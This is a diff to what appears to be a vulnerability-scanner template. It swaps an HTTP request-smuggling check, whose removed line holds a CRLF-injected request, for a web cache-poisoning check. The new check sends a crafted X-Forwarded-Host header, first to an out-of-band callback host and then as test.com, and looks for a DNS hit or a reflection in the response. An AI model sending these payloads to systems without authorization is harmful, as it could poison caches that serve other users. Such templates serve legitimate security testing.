@@ -10,17 +10,36 @@ info:
     Allows attacks to ptentially server harmful HTTP responses to other users.
   metadata:
     verified: true
-  tags: apache,cve,proxy,http,smuggling
+  tags: web,cache,poisioning,headers
 
 http:
   - raw:
       - |
-        GET {{Path}}%20HTTP/1.1%0d%0aFoo::%20bar HTTP/1.1
+        GET {{Path}} HTTP/1.1
         Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
-
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+  - raw:
+      - |
+        GET {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: test.com
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words: 
+         - "test.com"
